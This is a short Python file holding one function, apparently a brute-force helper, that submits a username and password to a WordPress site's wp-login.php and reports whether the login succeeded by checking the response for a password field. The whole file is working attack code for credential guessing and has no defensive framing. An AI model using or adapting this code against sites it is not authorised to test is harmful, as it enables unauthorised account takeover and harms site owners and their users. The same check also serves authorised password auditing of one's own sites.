import requests
def bf(url,email,password):
	r = requests.Session()
	x=r.get(url+'/wp-login.php')
	data={
		'log':email,
		'pwd':password,
		'wp-submit' : 'Log In',
		'redirect_to' : '',
		'testcookie' : '1'
	}
	z=r.post(url+'/wp-login.php',data=data)
	if 'type="password"' in z.text:
		return False
	elif 'name="pwd"' in z.text:
		return False
	else:
		return True
